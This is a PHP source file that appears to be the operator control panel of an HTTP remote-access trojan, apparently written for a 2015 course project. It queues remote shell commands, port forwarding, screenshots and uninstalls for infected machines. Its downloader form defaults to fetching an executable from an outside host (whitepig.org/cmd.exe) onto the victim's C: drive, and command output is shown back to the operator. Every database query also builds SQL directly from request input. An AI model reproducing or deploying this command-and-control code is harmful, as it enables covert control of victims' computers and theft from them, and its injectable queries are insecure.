<?php
require('header.php'); //一定要以无BOM格式存
require("config.php");


error_reporting(E_ALL ^ E_NOTICE);//显示除去 E_NOTICE 之外的所有错误信息

$mysqli = new mysqli($dbaddr,$username,$password,$dbname);
if(mysqli_connect_error())
{
	printf("数据库连接失败：%s\n",mysqli_connect_error());
	exit();
}

$idin=$_GET["id"];
if (!$idin)
	exit();
if(isset($_SESSION["admin"]))
{       

	/*echo '<head>
	<style type="text/css">
	div#container{width:500px}

	div#options {height:200px;width:500px;float:left;}
	div#feedback {height:200px;width:700px;float:right;}
	div#footer {background-color:#99bbbb;clear:both;text-align:center;}

	</style>
	</head>';*/


	$timenow = time();
	$result = $mysqli->query("SELECT * FROM status WHERE id = '$idin'");
	$row = $result->fetch_assoc();

	$timenow=time();
	$shellLT=$row["shellLT"];
	$tranLT=$row["tranLT"];

	echo '<div id="options">';
	echo '<p align="center">';
	echo 'Current Computer_id：'.$idin.'<br/><br/>';
	if (($timenow - strtotime($shellLT)) <= 4) 
		echo 'Shell：<a href="submit.php?'.'id='.$idin.'&do=shelloff"><span class="label label-info">On<span></a>&nbsp';
	else 
		echo 'Shell：<a href="submit.php?'.'id='.$idin.'&do=shellon"><span class="label label-default">Off</span></a>&nbsp';

	echo '&nbsp;&nbsp;&nbsp;&nbsp;';
	if (($timenow - strtotime($tranLT)) <= 4) 
		echo 'Ports Transmiting：<a href="submit.php?'.'id='.$idin.'&do=tranoff"><span class="label label-info">On<span></a>&nbsp';
	else 
		echo 'Ports Transmiting：<a href="submit.php?'.'id='.$idin.'&do=tranon"><span class="label label-default">Off</span></a>&nbsp';

	echo '&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<a href="submit.php?'.'id='.$idin.'&do=unistall">Uninstall it</a>&nbsp';
	echo '</p>';

	echo 
		'<form action="submit.php?id='.$idin.'" method="post">
		<div class="func-title float-left">shell command:</div>
		<input class="form-control float-left" type="text" name="shell"  value="ipconfig" />&nbsp<input type="hidden" name="id" value='.$idin.' />
		<input class="btn btn-primary" type="submit" value="Send Shell Cmd">
		</form>';//shell表单


	echo '<form action="submit.php?id='.$idin.'" method="post">
		<div class="func-title float-left">ports to transmit: </div>
		<input class="form-control float-left" type="text" name="ports" value="1000:4000" />&nbsp;
		<input type="hidden" name="id" value='.$idin.' />
		<input class="btn btn-primary" type="submit" value="Send Transmit Cmd">
		</form>';//端口转发表单

	echo '<form action="submit.php?id='.$idin.'" method="post">
		<div class="func-title float-left">downloader: </div>
		<input class="form-control float-left" type="text" name="url" style="width:300px;" value="http://www.whitepig.org/cmd.exe" />
		<input class="form-control float-left" type="text" name="filename" style="width:170px;" value="c:/test.exe" />&nbsp;
		<input type="hidden" name="id" value='.$idin.' />
		<input class="btn btn-primary" type="submit" value="Send Download Cmd">
		</form>';//download表单

	/* 2015-01-12 做课程设计的时候，因无法截屏，暂时注释掉
		echo '<form action="submit.php" method="post">
		<p align="center"><input type="hidden" name="snap" value="snap" />&nbsp;
		<input type="hidden" name="id" value='.$idin.' />
		<input type="submit" value="Send Snap Cmd">
		</p>
		</form>';//截屏表单
	*/
	
	echo 
	'<p align="center"><a href="submit.php?'.'id='.$idin.'">Refresh</a></p>
	</div>';
	
	if(file_exists("upload/temp.jpg"))
	{
		echo 'Screen Pic:</br>
			<a href="submit.php?'.'id='.$idin.'&do=delete">Delete Pic</a>
			<img src="upload/temp.jpg" />';
	}
	echo'<div id="feedback">
		FeedBack:</br>
		<a href="output.txt" target="_blank">Check Txt</a></br>
		<a href="submit.php?'.'id='.$idin.'&do=clear">Clear Txt</a>
		<p>
		<pre>';

	readfile("output.txt");
	echo '</pre>';
	echo '</div>';

}


//to save the cmd that hacker input and insert the cmd into database
if(($_GET["id"]!=NULL)&&($_GET["do"]=="shellon"))//开启命令行
{    
	$idin=$_GET["id"];
	$mysqli->query("UPDATE httprat SET cmd=2 WHERE id='$idin'");
}

if(($_GET["id"]!=NULL)&&($_GET["do"]=="shelloff"))//关闭命令行
{    
	$idin=$_GET["id"];
	$mysqli->query("UPDATE httprat SET shell=\"quit\" WHERE id='$idin'");
}


if(($_GET["id"]!=NULL)&&($_GET["do"]=="tranon"))//开启端口转发
{    
	$idin=$_GET["id"];
	$mysqli->query("UPDATE httprat SET cmd=3 WHERE id='$idin'");
	/*$time = date("Y-n-j H:i:s");
	$mysqli->query("UPDATE status SET tranLT = '$time' WHERE id = '$idin'");*/
}
if(($_GET["id"]!=NULL)&&($_GET["do"]=="tranoff"))//关闭端口转发
{    
	$idin=$_GET["id"];
	$mysqli->query("UPDATE httprat SET ports=\"quit\" WHERE id='$idin'");
}


if(($_GET["id"]!=NULL)&&($_GET["do"]=="unistall"))//卸载
{    
	$idin=$_GET["id"];
	$mysqli->query("UPDATE httprat SET cmd=9 WHERE id='$idin'");
}



if(($_POST["id"]!=NULL)&&($_POST["url"]!=NULL)&&($_POST["filename"])!=NULL)//下载文件
{    
	$idin=$_POST["id"];
	$mysqli->query("UPDATE httprat SET cmd=4 WHERE id='$idin'");
	$url=$_POST["url"];
	$filename=$_POST["filename"];
	$mysqli->query("UPDATE httprat SET url='$url' WHERE id='$idin'");
	$mysqli->query("UPDATE httprat SET filename='$filename' WHERE id='$idin'");
	$loc='location:submit.php?id='.$idin;

}


if(($_POST["id"]!=NULL)&&($_POST["snap"]!=NULL))//截屏
{
	$idin=$_POST["id"];
	$mysqli->query("UPDATE httprat SET cmd=5 WHERE id='$idin'");
	$loc='location:submit.php?id='.$idin;
	echo $loc;
	header($loc);
}

if(($_POST["id"]!=NULL)&&($_POST["shell"]!=NULL))//命令行
{

	$idin=$_POST["id"];
	$shell=$_POST["shell"];
	$mysqli->query("UPDATE httprat SET shell='$shell' WHERE id='$idin'");
	$loc='location:submit.php?id='.$idin;
	header($loc);

}

if(($_POST["id"]!=NULL)&&($_POST["ports"]!=NULL))//端口转发
{
	$idin=$_POST["id"];
	$ports=$_POST["ports"];
	$mysqli->query("UPDATE httprat SET ports='$ports' WHERE id='$idin'");
	$loc='location:submit.php?id='.$idin;
	header($loc);
}

if(($_POST["id"]!=NULL)&&($_POST["shell"]==NULL))
{
	$idin=$_POST["id"];  
	$loc='location:submit.php?id='.$idin;
	header($loc);
}


//清除回显

if(($_GET["id"]!=NULL)&&($_GET["do"] == "clear"))
{
	$idin=$_GET["id"];
	file_put_contents("output.txt","");
	$loc='location:submit.php?id='.$idin;
	header($loc);
}

if(($_GET["id"]!=NULL)&&($_GET["do"] == "delete"))
{
	$idin=$_GET["id"];
	unlink("upload/temp.jpg");
	$loc='location:submit.php?id='.$idin;
	header($loc);
}

$mysqli->close();

require('footer.php');
?>